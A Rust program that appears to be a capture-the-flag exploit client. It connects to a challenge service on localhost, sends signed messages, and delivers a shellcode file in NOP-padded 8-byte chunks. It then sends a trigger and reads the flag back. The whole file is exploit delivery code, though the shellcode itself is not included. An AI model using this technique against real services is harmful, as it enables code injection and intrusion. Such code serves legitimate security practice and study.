use std::net::TcpStream;
use std::time::Duration;
use std::io::{Write, Read};
use message_passing::sign;
use bytes::{Bytes};


fn main() {
println!("ddd");
    let shellcode = Bytes::copy_from_slice(include_bytes!("shellcode"));
    let mut connection = TcpStream::connect("localhost:3333").unwrap();
    connection.set_read_timeout(Some(Duration::from_millis(20)));
    let mut buf = [0u8; 4];
    while &buf != &[1, 1, 1, 1] {
println!("{:?}", buf);
        connection.write(&sign([0x2d, 0x94, 0x22, 0x9b, 0x15, 0x98, 0x91, 0x11]));
        connection.read(&mut buf);
    }




    for i in shellcode.chunks(8) {
println!("sending shellcode chunk");
        let mut buf = [0u8; 4];
        let mut shellcodebuf = [0x90; 8];

        for (dst, src) in shellcodebuf.iter_mut().zip(i) {
            *dst = *src
        }

    //    shellcodebuf.copy_from_slice(i);
        while &buf != &[1, 1, 1, 1] {
            connection.write(&sign(shellcodebuf));
            connection.read(&mut buf);
        }
    }
println!("message sent");
    let mut buf = [0u8; 4];
    while &buf != &[1, 1, 1, 1] {
        connection.write(&sign([0x65, 0x91, 0x9, 0x44, 0x00, 0x12, 0x8f, 0xff]));
        connection.read(&mut buf);
    }

    let mut str = [0u8; 10];

println!("waiting for flag");
loop { // lemonthink
    connection.read(&mut str);
let res = std::str::from_utf8(&mut str).unwrap();
     print!("{}", res);
if res.contains('}') { break }
}
println!();
}
